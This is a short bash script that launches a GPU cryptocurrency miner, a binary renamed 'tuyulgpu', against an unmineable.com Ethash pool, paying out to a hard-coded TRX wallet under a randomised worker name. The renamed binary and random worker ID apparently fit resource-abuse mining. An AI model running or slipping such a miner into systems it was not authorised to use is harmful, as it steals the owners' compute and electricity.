#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TSPTZubmtC9Mvqi24CqisKDpwxaN3yL5st
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-RHYTHM#jinc-0e42)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
